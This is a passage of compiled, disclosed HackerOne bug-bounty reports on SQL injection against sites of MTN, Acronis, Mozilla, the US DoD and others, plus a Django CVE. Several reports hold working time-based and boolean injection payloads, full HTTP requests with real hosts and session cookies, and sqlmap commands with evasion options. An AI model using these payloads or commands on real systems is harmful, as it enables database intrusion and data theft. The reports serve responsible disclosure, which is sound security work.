The sql code that get executed is:
`SELECT COUNT("model_fields_nullablejsonmodel"."id") AS "count", (CASE WHEN JSON_TYPE("model_fields_nullablejsonmodel"."value_custom", ?) IN ('true','null','false') THEN JSON_TYPE("model_fields_nullablejsonmodel"."value_custom", ?) ELSE JSON_EXTRACT("model_fields_nullablejsonmodel"."value_custom", ?) END) AS "value_custom__beeeee"" FROM "model_fields_nullablejsonmodel" WHERE "model_fields_nullablejsonmodel"."value_custom" IS NOT NULL GROUP BY 2`

## Impact

if user input get into `.values(` the user will able to create sql injection attack.

I hope you have best day :)

Eyal

---

### [SQLi | in URL paths](https://hackerone.com/reports/2958619)

- **Report ID:** `2958619`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** MTN Group
- **Reporter:** @almuntadhar0x01
- **Bounty:** - usd
- **Disclosed:** 2025-03-06T11:54:55.130Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
A SQL Injection vulnerability was discovered in the customerId parameter of the URL path:
`███████`
We can observe this by adding a little quote in the customerId:
█████████
which will show the following error, indicating that its vulnerable to SQL Commands Injection:
███████

## Steps To Reproduce:
We can use any SQL Commend here, by just closing the Statement ( putting `')` and then use a command and also we make sure to make the rest as a comment, here is a basic SQL command i used:
███████
or we can use tools like SQLmap to get access to the database, here is the command i used:
```
sqlmap -u "██████
```
██████

## Impact

## Summary:

An attacker can exploit this to dump and download the database, Which will give them access to user informations.

**Summary (researcher):**

## How is this in scope?

--> https://www.mtn.co.za/insurance/device-cover/
{F4301195}

```bash
site:admyntec.co.za intitle:"MTN"
```

---

### [CVE-2024-53908: Django Potential SQL injection in `HasKey(lhs, rhs)` on Oracle](https://hackerone.com/reports/2882887)

- **Report ID:** `2882887`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Internet Bug Bounty
- **Reporter:** @scyoon
- **Bounty:** - usd
- **Disclosed:** 2025-02-07T15:07:20.808Z
- **CVE(s):** CVE-2024-53908

**Vulnerability Information:**

I've found a potential SQL Injection vulnerability and reported it to the Django team. You can find detailed information at the following link:

- https://www.djangoproject.com/weblog/2024/dec/04/security-releases/
- https://nvd.nist.gov/vuln/detail/CVE-2024-53908

Direct usage of the `django.db.models.fields.json.HasKey` lookup on Oracle is subject to SQL injection if untrusted data is used as a lhs value. Applications that use the `jsonfield.has_key` lookup through the `__` syntax are unaffected.

## Impact

This vulnerability could potentially allow an attacker to execute arbitrary SQL commands, leading to unauthorized access, data manipulation, or information disclosure. The issue affects the Django Framework, particularly when using the `HasKey` lookup on Oracle databases.

**Summary (team):**

###CVE-2024-53908: Potential SQL injection in HasKey(lhs, rhs) on Oracle

Direct usage of the django.db.models.fields.json.HasKey lookup on Oracle is subject to SQL injection if untrusted data is used as a lhs value. Applications that use the jsonfield.has_key lookup through the __ syntax are unaffected.

Thanks to Seokchan Yoon for the report.

This issue has severity "high" according to the Django security policy.

---

### [SQL injection in URL path leads to Database Access](https://hackerone.com/reports/2633959)

- **Report ID:** `2633959`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** MTN Group
- **Reporter:** @tinopreter
- **Bounty:** - usd
- **Disclosed:** 2025-01-08T10:40:53.785Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The application https://corporate.admyntec.co.za/ application has an SQL injection in the URL paths since it takes the ID numbers in there and insert them directly into the backend SQL query without sanitizing them. In the registration, user ID number(Passport or National ID), Organization number are requested, as well as relevant docs. These are all stored in the backend Database.

https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0

## Steps To Reproduce:

  1. Using the URL generated when we get displayed the Insurance.   

{F3484515}  

  2. Introduce a single quote next to the customerId number and you realize this breaks the backend query.

```
https://corporate.admyntec.co.za/customerInsurance/newCustomerStep8/userId/868878/customerId/732562'/contactPersonId/0  
```
{F3484523}  
  3. Send this URL to any SQL epxloitation tool like SQLmap, Add an asterisk to the customerId number to tell the tool that's the injection point.  We can dump the database now.

{F3484537}  

##Please Note That This Occurs throughout many URL paths in the application.

#Recommendation
If you are taking parameters and inserting them into the backend SQL query, sanitize them to do away with any special characters attached to them.

Consider putting the application behind a WAF to make a potential SQLi vulnerability exploitation a bit tedious for an attacker.

## Impact

An attacker can exploit this to dump and download the backend database. This will give them access user information.

---

### [SQL Injection](https://hackerone.com/reports/2737595)

- **Report ID:** `2737595`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @k0x
- **Bounty:** - usd
- **Disclosed:** 2024-10-25T15:27:56.819Z
- **CVE(s):** -

**Vulnerability Information:**

I discovered a Blind SQL Injection vulnerability in the application, which allows an attacker to manipulate database queries by injecting malicious input into the vulnerable parameter. Unlike regular SQL injection, blind SQL injection does not directly return data but can be exploited through true/false or time-based responses, revealing the structure and content of the database.

## References

## Impact

Blind SQL injection can be leveraged to extract sensitive information, bypass authentication, or escalate privileges by manipulating the backend SQL queries. Since the injection is blind, an attacker can use time-based, boolean-based, or out-of-band techniques to extract the data.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
Run SQLMap: Use the following SQLMap command to test for SQL injection by directly specifying the vulnerable URL and the parameter:

```bash
sqlmap -u "███████" \
--technique=BT --level=5 --risk=3 --threads=10 -p 'filter[event]' \
--dbms='MySQL' --batch --current-db --random-agent
```

**-u:** Specifies the target URL.
**--technique=BT:** Tells SQLMap to use both Boolean-based (B) and Time-based (T) blind SQL injection techniques.
**--level=5:** Sets the highest level of testing, increasing the depth of testing.
**--risk=3:** Specifies a higher risk level for potentially dangerous payloads.
**--threads=10:** Increases the number of concurrent requests, speeding up the process.
**-p 'filter[event]':** Specifies that the filter[event] parameter is the target for injection.
**--dbms='MySQL':** Indicates that the target database management system is MySQL.
**--batch:** Automatically answers all questions (non-interactive mode).
**--current-db:** Attempts to retrieve the current database name.
**--random-agent:** Randomizes the User-Agent header to evade detection.

████████

## Suggested Mitigation/Remediation Actions

---

### [SQL injection in https://demor.adr.acronis.com/ via the username parameter](https://hackerone.com/reports/1436751)

- **Report ID:** `1436751`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** Acronis
- **Reporter:** @mmg
- **Bounty:** - usd
- **Disclosed:** 2024-08-28T09:01:45.322Z
- **CVE(s):** -

**Vulnerability Information:**

I have discovered a SQL injection in https://demor.adr.acronis.com/  using the POST request via the username parameter.
Using the Repearter in Burpsuite I have submitted the following POST request:

POST /ng/api/auth/login HTTP/2
Host: demor.adr.acronis.com
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Referer: https://demor.adr.acronis.com/
Cookie: PHPSESSID=bsrq24l7g5fmth5b683v2b3gu4
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Encoding: gzip,deflate,br
Content-Length: 148
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36

{"username":"0'XOR(if(now()=sysdate(),sleep(35),0))XOR'Z","id":"27","password":"cc4226104294e44c5cec9f31cb6de7fa4597e4321b277f4e4b78c3a0ff980956"}

Which resulted in a 35 seconds delayed response (one of the print screens, named 35 captured this).


Using various values for the sleep function you get various time responses. 

0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.336
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.332
0'XOR(if(now()=sysdate(),sleep(3),0))XOR'Z => 3.352
0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z => 15.327
0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z => 6.337

I have attached two print screens from burp showing 16 and 35 seconds responses that were used in the payloads.

## Impact

An attacker can use SQL injection it to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database.
This can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

---

### [SQL injection in /errors/viewbuild/](https://hackerone.com/reports/690349)

- **Report ID:** `690349`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Valve
- **Reporter:** @njbooher3
- **Bounty:** - usd
- **Disclosed:** 2024-07-30T23:28:53.369Z
- **CVE(s):** -

**Summary (team):**

A SQL injection vulnerability was found on a partner-facing tool that allowed queries against a legacy backing store.

**Summary (researcher):**

.

---

### [Blind SQL Injection on █████ via URI Path](https://hackerone.com/reports/2266081)

- **Report ID:** `2266081`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Mars
- **Reporter:** @stuux
- **Bounty:** - usd
- **Disclosed:** 2024-02-14T15:24:09.267Z
- **CVE(s):** -

**Summary (team):**

Time-based SQL injection is a hacking technique that capitalizes on vulnerabilities in systems interacting with databases. Unlike traditional SQL injection methods that directly manipulate data, this approach leverages delays in database processing to extract information. Attackers insert malicious SQL statements into input fields of web applications lacking sufficient security measures. If successful, these statements execute against the database, and by intentionally causing delays in processing, the attacker can infer information about the database structure or obtain sensitive data based on the application's response time to specific queries.

---

### [SQL Injection on prod.oidc-proxy.prod.webservices.mozgcp.net via invite_code parameter - Mozilla social inscription](https://hackerone.com/reports/2209130)

- **Report ID:** `2209130`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Mozilla
- **Reporter:** @supr4s
- **Bounty:** - usd
- **Disclosed:** 2024-01-30T13:29:52.510Z
- **CVE(s):** -

**Vulnerability Information:**

Hi everyone,

Hope you are well ! 

I wanted to play on [https://mozilla.social](https://mozilla.social), however this requires a user account and an invitation code as it's not open to the public. When entering an invitation code, the user is redirected to `prod.oidc-proxy.prod.webservices.mozgcp.net`.

{F2773206}

Playing around with what's on offer, I've noticed that the `invite_code` parameter is vulnerable to a PostgreSQL injection.

## Steps To Reproduce:

During registration, the following POST request is made : 

```
POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/2
Host: prod.oidc-proxy.prod.webservices.mozgcp.net
Cookie: <session_cookies>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.9999.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 119
Origin: null
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Ch-Ua-Platform: "macOS"
Sec-Ch-Ua: "Google Chrome";v="103", "Chromium";v="103", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Te: trailers

handle=xxx&display_name=xxx&invite_code=xxx-&age=25&terms=on&rules=on
```

Adding a single quote to the `invite_code` parameter returns a 500 error, and adding a second quote returns a 200. **Red flag**

After a few tests, here is a time-based blind payload to confirm the vulnerability : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

{F2773210}

Confirm with the response from the server - which takes 5 seconds to reply.

Now, 10 seconds : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--
```

{F2773214}

Same here, 10 secs before getting an answer.

20 sec : 

```
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
```

{F2773218}

etc.

## Impact

From [OWASP](https://owasp.org/www-community/attacks/SQL_Injection) : 

> A SQL injection attack consists of insertion or “injection” of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system and in some cases issue commands to the operating system. SQL injection attacks are a type of injection attack, in which SQL commands are injected into data-plane input in order to affect the execution of predefined SQL commands.

I'm working on a data exfiltration and will update the report as needed.

Looking forward to exchanging.

Regards,
Supr4s

---

### [Time based SQL injection at████████](https://hackerone.com/reports/2312334)

- **Report ID:** `2312334`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @aziz0x48
- **Bounty:** - usd
- **Disclosed:** 2024-01-26T18:56:56.156Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

While doing test on██████, I’ve found that the endpoint at /pubs/index.php is vulnerable with SQL injection vulnerability.
Vulnerable parameters are 'years' and 'authors'

## References
Please check screenshots attached.

## Impact

Time based SQL injection can lead to the exfiltration of sensitive data from the database.

## System Host(s)
███████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
## POC

Make the following POST request to /pubs/index.php

```
POST /pubs/index.php HTTP/1.1
Host:██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://███████
Referer: https://███████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

Notice that the response time will be 4 seconds.


```
POST /pubs/index.php HTTP/1.1
Host:█████████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://████████
Referer: https://████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
```

Notice that the response time will be 25 seconds.

This can be further exploited manually or using automated tools such as SQLmap to get data from the DB, but I will stop here for this report.

Thanks.

## Suggested Mitigation/Remediation Actions

---

### [SQL injection at ███████](https://hackerone.com/reports/2256032)

- **Report ID:** `2256032`
- **Severity:** Critical
- **Weakness:** SQL Injection
- **Program:** Sony
- **Reporter:** @testingforbugs
- **Bounty:** - usd
- **Disclosed:** 2024-01-24T18:53:09.341Z
- **CVE(s):** -

**Summary (team):**

The researcher reported that a Sony website was vulnerable to an error-based SQL injection. The researcher was able to demonstrate the vulnerability by using SQLMap to extract data from the database such as database names.

---

### [Blind Sql Injection in https://█████/qsSearch.aspx](https://hackerone.com/reports/2081316)

- **Report ID:** `2081316`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hack0neone
- **Bounty:** - usd
- **Disclosed:** 2023-09-08T17:19:05.710Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

access

https://████████/qsSearch.aspx

Click to sort capture packets

```
POST /qsSearch.aspx HTTP/1.1
Host: ████████
Cookie: ASP.NET_SessionId=qrwzcesx1pczpna5a1bumabn; TS01e0cc7d=01a9fe659bc0aaa5aeffd1dcb0212ef4158c4865925e960169a653a233f6de5425138871ffe81b759d57e8cd4d192f460a8455c20a; TS64c50bb0027=085749d0e4ab2000abff03ce041a6de3cdc980bad78329f846f8a7d1a3ca714fca41b9f4477ff74908e5615eaa1130003df96bf750318bbc06de7b8d1dc03b675cf0ea51da191b5c8a95008b8d5b3f758c0ed139489903314d8927a8c58c8d9d
Content-Length: 3764
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
X-Microsoftajax: Delta=true
Sec-Ch-Ua-Platform: "Windows"
Accept: */*
Origin: https://██████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://██████████/qsSearch.aspx
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

ScriptManager1=UpdatePanelWhole%7CGetFilteredButton&DocumentIDTextBox=&IDNumberTextBox=&DropDownListStatus=&DocumentTitleKeyWords=&DropDownListContains=AND&DropDownListTitleOrKeywords=TOS&TextBoxBegin_Date=24-Jul-2022&TextBoxEnd_Date=24-Jul-2023&FromSession_HFS=0&DocumentIDTextBox_HFS=&IDNumberTextBox_HFS=&DropDownListStatus_HFS=&DocumentTitleKeyWords_HFS=&DropDownListContains_HFS=&DropDownListTitleOrKeywords_HFS=&ExListBoxFSCHF=1010&ExListBoxFSCHFN=2&ExListBoxFSCHFN_HFS=&UseTransDateCheckBox_HFS=&TextBoxBegin_Date_HF=24-Jul-2022&TextBoxEnd_Date_HF=24-Jul-2023&TextBoxBegin_Date_HFS=24-Jul-2022&TextBoxEnd_Date_HFS=24-Jul-2023&Command_HFS=&divPreamble_HF=block&HiddenFieldSortOrder=seqno&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=q7mOdp7JADLouhLb0iBsjhyqsgYBjR4m66bmTYp5jGGY0Unk%2FoBSV%2FV5DY4cM8i4AetQ7yIP7NpGAwDZNg1mENuO17N0e9RMjj9k84Mz8Z12lbblsQ3pvMzMXGqVFlV5AapE1ZPF3Lw3mHyNQwU9U8rmLIlySVVc9Fq9r1FEk4E198exJH0aVmUhqMLdX6ah4%2F4jaTRYRASPB6C8VdKG2gvAnVsh%2BQzU05lZGLYsqw8j8EiFXbKKni0hgSjiD%2B%2BanYn9w4xMz5llIOP81jz9jSB479hqo3yuFWuOO91Vr539KvcO7XzstILWDgVLtDeDPw3p2DTZM2PS0vOVnNDpJX6rr76mJfFWD9DJUOSkvCDpz0tGwNcGWZPO0j%2FkaUY%2Fh9L5%2FOblr4Zd6XcWiyo3Sal%2BtCvQnZuzPyCjL33IEpuGojcsUBeY8Aq%2FkFbVr%2Be3cXUSzzBwirfXTdneWQFQlfq8xWxKI2YHsnLZHLNKB3%2FsgP0vvRV1yXvsbC9RfTGhUiK2S%2Bg4XHzadLggy5djNZMHvoulqRwagO7EeksJyWGma9jVCQoc4Vqe3IjRbjmyaZOltk%2BZxh%2FC9P%2BPdT9lhapBOyuXvVDJL862rRIIfJEUo9NJ0ES%2FRRHdk2NO44DsXT99Rj89iOZY1ZgFaAqQEYXhVQEIfFdyMjP52QR2d6ljjjQahESe88R34h9YuLQVGMnZnqwCSgOqjD%2Fw7iuA4fkYrq5zu2muXogAnT%2BYdVe03PNUlMAhdr3oVzTmipt2ezsMpNtGU%2B%2FKO67w8xvPtdMcU1r%2FDWXlU%2BMgnxpWKBfcwk8BMKvSStAX7lxPg%2BAFXJ4W%2B4mMAg6xybe8nfyVtfbcC%2FLT21%2FAo6DA1EP0%2Bquy6r7RSx%2BCSQiQ9FMEn29J%2FEvOYsub01L3h%2FHXt5%2BgfM9lWS1DRQmEbIT9Sy9aXm895QHjFJwR4ZKU%2FV2YqyvpqYxBstMen3tClb74MXUOGLEwkR2SajMOnEvafbc2eND%2BeGkhPvX308aFuCcS92UIOD0YE52Xf%2FvCaFkbYhBFQ3DDTvEsKYq%2Feiv2tdt3t34jpVDYpVuZBjYrE5CKYNZ%2FshSfBGFd3WkyogypS6WwmW4p8tAIP6nZbewu3ljQmfclpQfSEZ1U86hc7R6%2F8Qi5H%2FUoPZkSXdhS7YZ%2FUk2uEFJpMPbwrRIisJZDWOK1iXXUfLGlJNHpqXz%2By1HAWEAgoROMjB3PDciwlG4qOWWNf8kHBIXh4mABbQTBRCSviGCU%2B40mxFN5mCxIDlyVSrZtctMDlDEXxsDrgMlIYF9tPu14HiIkcvTvRRDAilxLNj4oJltCSn9Q4KaohPoOCTCB%2FBDChs7i%2FP%2FtVlVv2hseFoW%2FL5nnXrzZwtQ89g1tukB6B0%2BLNIHSPMTNjHfS94KBTjlI%2BDyJQ1moLRAqrI08LuxR5oL4I4xQWFMokDUes%2F9919T%2BsFFY83LeW8l2cnq9HXs1VHWZC52iEE6NKL3O%2FY8rb8ZzJWx73Vy6%2F4ycbMhmXmBKDL0jPp7pWQwCSF%2Bi3utC6fYzXYVplK%2F%2FUB%2Bl%2Fx3FHulj%2BxbNXbXDNwW9la1gvmiZCBVNBF8Hs9f723CNP9Mk36HeRhnqrv%2BXjT3ru9VUIreZuYLP%2FJMDsMa5hkxNqsGSiYSaVnQdNoh16MX%2FpwD9TFjeLR9trbuYbOe85Q%3D%3D&__VIEWSTATEGENERATOR=23D07230&__VIEWSTATEENCRYPTED=&__EVENTVALIDATION=fsWUuj%2Bv6uAzn%2BPDJy53TOV1EcwpGMzzgrX8HnHdm3%2BXLE0nnYzmv2wV%2FC1MQ36juB9R3FuomPHAhDRTQjaWLLfUo8wqsKkA5oRH27Q0drnd19OLne7P%2F1e7JVyrg3T7IUqgzt668Uf70ylQ0%2Fzm3R8l55e7NMhkJqrNAfwmRnqo01McSaS%2FfV2vktFK2Xg07rplRCRRnjFxz7PgRNyHTd27PGi2JuvyZ661dcSKhHjRUnOe2JvQjiSZRCepgNLisbabLxz3fm%2B1iLqiMbDSRQ%2B%2FD9NNzQ7zv3dFfSQUnFPX7n1%2BN1rxmuSYIrjumhEcO4WaCoted6V4GkC2aj2XlwuOdyJCc5KK83LLHqei%2FQ%2BOYJ70T2sxY5kfRDyc6T5%2BMoqHE6Xl9T6fgHQNss4Ed5vnM1hZ3wZQF2roYILiJnGRewNWVEtDjNbGId6AosGd%2BG8TPm5qmRver%2Fwe%2F61TFc7jVz6dKVS30uH7AAbYcbuytwOXLSNwGrfEQdJWBRfL0fof2hrE1%2BnpdhhTCaZr09ezPUk6vJZKXWxxwYfIcDAiy6VF696%2BrN1sK3DqQY2Ml1ycdVU9IGR7gt0JAr256BTzhp2JqdP3MUmPfzzJUb8yPVIdutWg4s6wd9hZJOffo1XGfM97vgmG31OsKt6Ce5%2Fnvd9EtqYThA73N7lRz3Rbia%2FoGCb%2BSZT%2Fgry9ERSpe772GIZgiIkfmmIH81KdA3ng3UGEUW%2BJQaJ1nqUpqa%2BkvQoXNYP6cgpyJXpqPUBh92Dur9tj6rGmgFWcHMly1EoNjkhmUq2A3Rx3Y4cv8%2F%2FFXK0Q3FHiGe838a3kotnxO5JySmyB%2FaV4pfNfyo0YVRk51Od9eE7%2FtAKgSe11mFqXg2cB0SEJn7JIhMBuozxVV6hW1ja2QpLVxqZxfar1K3Fw8gk%2FOcYpDaEVlE8MLzAft9GeMFoKWMCNXkY9jz80fSlJzDLSHEZ%2BVahTxgsrEeQpo9IzdKvvm2p6RPOYIS4%3D&__ASYNCPOST=true&GetFilteredButton=Search
```

HiddenFieldSortOrder is sql injection parameter


███

payload：

user length=5

seqno-DECODE(length(user),5,1,1/0)   The page returns normal data
█████

The length of the user is incorrect, and the page returns abnormal data
████████

and

user=QSWEB
seqno-DECODE(lpad（user,5),'QSWEB',1,1/0)  The page returns normal data
███

The database user does not return abnormal data to the page
███

We can use the burp intruder template to violently enumerate database usernames .Judging whether the user is correct based on the returned length

███
█████

 
## References

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
seqno-DECODE(lpad(user,5),'QSWEB',1,1/0)

true 


seqno-DECODE(lpad(user,5),'QSWE1',1,1/0)

false

## Suggested Mitigation/Remediation Actions

---

### [Blind Sql Injection in https://████████/](https://hackerone.com/reports/2072306)

- **Report ID:** `2072306`
- **Severity:** High
- **Weakness:** SQL Injection
- **Program:** U.S. Dept Of Defense
- **Reporter:** @hack0neone
- **Bounty:** - usd
- **Disclosed:** 2023-09-08T17:18:14.800Z
- **CVE(s):** -

**Vulnerability Information:**

**Description:**

first  browse url
https://█████████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/Storefront

find login 

then notice register

████████

███████

click register 

https://████/DSF/SmartStore.aspx?gktTg9gFCEBknhRFawes89EY4WcuDKHZNYh58W8kzOWv0SM9Nk6SFMv570fOCer/BHfPrtRYtqRvYJ88zd0KsQ==&random=0.7493498572981403#!/RegisterUser

click Choose Facility
█████████

We can see a search box
█████████

```
POST /DSF/webservices/StorefrontService.asmx HTTP/1.1
Host: ████████
Cookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab200041fc059864d60f7079a5bba1c971a9b0ec2c518a8be95c59408233620a4046e908a71691ce11300072991b95acde4750057dcf4b690fc5d287bd05e77fb374c2ef003c7fa6de858098c8aded9cd3dbae4fb2b4cb23fae3f4
Content-Length: 945
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Accept: application/xml
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Soapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Origin: https://███
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://█████/DSF/SmartStore.aspx?6xni2of2cF01Wh1WA1f8KvqWdFIzCmht0+f1rjakhLYZYEorRbI5CMSxx2CBgN1b
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

      <soapenv:Envelope xmlns:soapenv='http://schemas.xmlsoap.org/soap/envelope/' xmlns:xsi='http://www.w3.org/2001/XMLSchema-instance' >      <soapenv:Header>     <AuthenticationHeader xmlns='http://www.efi.com/dsf/BuyerTicketClientServices'>      <SiteGUID>17b9c74a-f80b-4e48-b274-729acb2e14ad</SiteGUID>
<SessionTokenID>49f22361-1243-4cde-9788-7bad2eb575ed</SessionTokenID>
<TimeOut>20</TimeOut>
<CultureName>zh-CN</CultureName>

      </AuthenticationHeader>      </soapenv:Header>     <soapenv:Body>      <GetAllFacilitiesForNewUserRegistration xmlns='http://www.efi.com/dsf/StorefrontService'>      <companyId>-1</companyId>
<cultureName>zh-CN</cultureName>
<sortColumn>description</sortColumn>
<sortOrder>asc</sortOrder>
<searchValue>*</searchValue>
<currentPageIndex>1</currentPageIndex>
<recordsToFetch>10</recordsToFetch>

      </GetAllFacilitiesForNewUserRegistration>      </soapenv:Body>      </soapenv:Envelope>
```

search box exist  Blind Sql Injection

searchValue is  Vulnerability parameters


sqlmap
payload

python2  sqlmap.py -r 11.txt --random-agent --batch --technique=b --dbms=mssql   --force-ssl  --level 3 --skip-urlencode


11.txt is Displayed packets

███



db_name()=dsfdb

user=public\dsfwsuser
████████




## References

## Impact

An attacker can use SQL injection to bypass a web application's authentication and authorization mechanisms and retrieve the contents of an entire database. SQLi can also be used to add, modify and delete records in a database, affecting data integrity. Under the right circumstances, SQLi can also be used by an attacker to execute OS commands, which may then be used to escalate an attack even further.

## System Host(s)
██████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
```
POST /DSF/webservices/StorefrontService.asmx HTTP/1.1
Content-Length: 1002
Host: ███████
Cookie: ASP.NET_SessionId=1phpamlj3ghg13yranwpwyc4; LASTSITEACTIVITY=17b9c74a-f80b-4e48-b274-729acb2e14ad; _____SITEGUID=17b9c74a-f80b-4e48-b274-729acb2e14ad; BIGipServerdso_dla_pool=!bMk2BVeAkzRdd6t/+hAGiDi1KgdSoi+88iAAs7+CvOtONGAdcnAhOqOuh++pi3IS36YNq+YVfr5l8HI=; TS01a7bc09=01a9fe659b2979abff2645807c9ce81ffbeeeeaafa33f9038d5a1c59dd219a29ce68fa7d4edb9afe6bb9488ceb9c8dd10214f84f28; DSFPartnerID=yaY5gqbGhOY=; TS2f53739b027=085749d0e4ab2000cf04a7295483e1cce16ccb87209e7981813dc0a125020d3f249e89ef86527dcf08fb4cab96113000ae5fba89a9fed5ab8b1354f1c8230167554658dd447c5fc3027504fa66671acba512aa2d0978507583469676a770ea4c
Sec-Ch-Ua: "Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"
Accept: application/xml
Content-Type: application/json;charset=UTF-8
Sec-Ch-Ua-Mobile: ?0
Soapaction: http://www.efi.com/dsf/StorefrontService/GetAllFacilitiesForNewUserRegistration
Sec-Ch-Ua-Platform: "Windows"
Origin: https://████████
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
